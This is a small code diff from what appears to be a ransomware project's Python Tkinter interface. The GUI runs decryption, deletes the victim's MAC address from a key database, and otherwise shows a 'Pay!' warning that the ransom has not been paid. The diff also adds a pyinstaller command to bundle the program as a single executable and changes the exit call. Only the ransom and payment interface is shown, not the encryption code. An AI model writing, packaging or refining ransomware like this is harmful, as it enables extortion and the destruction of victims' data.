@@ -6,6 +6,7 @@ from uuid import getnode as get_mac
 
 
 #sudo apt-get install python3-tk
+#pyinstaller --onefile --hidden-import=tkinter  GUI.py
 
 
 
@@ -33,7 +34,7 @@ class GUI:
             self.ransom.startDecryption()
             self.keyManager.removeThisMacFromDB() #Temp svo thad tharf ekki ad eyda ut ur gagnagrunni manual.
             messagebox.showinfo('Decrypted','Everything has been decrypted.')
-            quit()
+            sys.exit()
         except Exception as error:
             print(error)
             messagebox.showwarning('Pay!','You have not payed.')
